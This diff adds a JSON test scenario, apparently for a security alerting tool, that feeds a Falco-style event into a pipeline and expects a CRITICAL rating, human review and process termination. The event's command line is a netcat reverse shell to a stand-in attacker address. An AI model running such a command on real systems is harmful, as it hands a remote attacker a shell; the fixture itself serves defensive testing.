@@ -1,0 +1,17 @@
+{
+  "scenario_name": "Netcat Reverse Shell",
+  "expected_severity": "CRITICAL",
+  "expected_hitl": true,
+  "expected_action": "TERMINATE_PROCESS",
+  "raw_payload": {
+    "class_uid": 1007,
+    "activity_id": 1,
+    "severity_id": 5,
+    "process_name": "nc",
+    "process_pid": 31337,
+    "command_line": "nc -e /bin/sh 203.0.113.9 4444",
+    "device_hostname": "web-prod-01",
+    "product_name": "Falco",
+    "time": 1710000010
+  }
+}
